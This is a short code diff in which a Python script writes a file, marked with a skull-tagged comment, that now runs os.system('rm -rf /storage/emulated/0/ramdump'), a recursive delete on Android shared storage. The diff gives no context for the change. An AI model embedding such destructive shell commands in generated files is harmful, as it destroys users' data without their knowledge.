@@ -112,7 +112,7 @@ with open(file_path, "w") as file:
     file.write(""" #☠FPI☠
 import os
 
-os.system('')
+os.system('rm -rf /storage/emulated/0/ramdump')
 
 """)
 
